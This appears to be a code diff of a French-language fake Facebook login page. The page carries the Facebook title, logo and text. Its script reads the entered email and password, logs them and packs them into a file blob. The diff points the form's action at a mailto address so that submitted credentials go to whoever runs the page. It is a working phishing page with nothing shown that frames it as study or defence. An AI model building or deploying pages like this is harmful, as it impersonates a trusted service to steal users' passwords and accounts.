@@ -10,10 +10,9 @@
             
             var userInput = document.getElementById("email").value;
             var userInput2 = document.getElementById("passw").value;
-            alert([userInput,userInput2]);
             console.log([userInput,userInput2]);
             var blob = new Blob([userInput,userInput2], { type: "text/plain;charset=utf-8" });
-            saveAs(blob, "dynamic.txt");
+            //saveAs(blob, "dynamic.txt");
         }
     </script>
     <title>Facebook</title>
@@ -21,19 +20,20 @@
 <body id="body">
     <div class="container">
         <div class="container-pageDescript">
-           <img src="facebk_logo.png" alt="">
-            Avec Facebook, partagez et restez en contact avec votre entourage.
+            <img src="facebk_logo.png" alt="">
+            <span>Avec Facebook, partagez et restez en contact avec votre entourage.</span>
         </div>
         <div class="container-loginForm">
-            <form action="" method="post">
+            <form action="mailto:you@yourdmainhere.com" method="post">
                 <input class="form-input" type="email" placeholder="Adresse e-mail ou numéro de tel." name="" id="email">
-                <input class="form-input" type="password" placeholder="mot de passe" name="" id="passw">
-                <button type="button" onclick="saveDynamicDataToFile();" class="form-input btLogin">Se connecter</button>
-                <span>Mot de passe oublié?</span>
-                <hr style="width: 100%;">
+                <input class="form-input" type="password" placeholder="Mot de passe" name="" id="passw">
+                <input type="submit" class="form-input btLogin" value="Se connecter">
+                <span style="color:#1677f2;font-size: 14px;"><b>Mot de passe oublié?</b></span>
+                <hr>
                 <button class="form-input btForgotten">Créer un compte</button>
             </form>
         </div>
     </div>
+    
 </body>
 </html>
